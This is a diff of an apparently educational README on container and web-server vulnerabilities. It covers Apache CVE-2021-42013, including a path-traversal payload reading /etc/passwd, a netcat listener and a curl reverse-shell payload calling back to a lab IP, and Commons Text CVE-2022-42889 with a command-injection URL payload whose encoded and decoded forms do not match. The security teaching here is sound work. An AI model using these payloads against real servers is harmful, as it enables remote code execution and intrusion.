@@ -10,7 +10,22 @@
 - This issue affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
 - Path Traversal payload - ``` http://172.17.0.2:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd ```
 - Actual payload After double URL decode - ``` http://172.17.0.2:80/cgi-bin/../../../../../../../etc/passwd ```
-- References: https://github.com/twseptian/cve-2021-42013-docker-lab
 - Netcat listening on ``` $ nc -lvnp 4444  ```
 - RCE Payload: ``` $ curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" "http://172.17.0.3:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash" ```
+- References: https://github.com/twseptian/cve-2021-42013-docker-lab
+</details>
+
+<details> 
+<summary> 2: Insecure Container Images </summary>
+- By compromising the insecure container images, attacker can gain access to applications. 
+- Resolution: Implementation of Image Scannings (To identify vulnerabilities) and Signature Validations (to ensure Images are Trusted)
+- Best practises: Use minimal base images that conbtain only necessary libraries
+
+#### CVE-2022-42889 (Command Injection)
+- The vulnerability exists in the StringSubstitutor interpolator object. An interpolator is created by the StringSubstitutor.createInterpolator() method and will allow for string lookups as defined in the StringLookupFactory. This can be used by passing a string “${prefix:name}” where the prefix is the aforementioned lookup. Using the “script”, “dns”, or “url” lookups would allow a crafted string to execute arbitrary scripts when passed to the interpolator object.
+- This issue affects Apache Commons Text versions 1.5 through 1.9.
+- Cmd Injection URL Payload - ```https://your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch+%2Ttmp%2Fhelloworld%27%29%7d ```
+- Actual payload after decode - ```https://your-target.com/exploit?search=${script:javascript:java.lang.Runtime.getRuntime().exec('touch helloworld')}
+- After successful execution a file helloworld will be created in app server.
+- References: https://github.com/devenes/text4shell-cve-2022-42889
 </details>
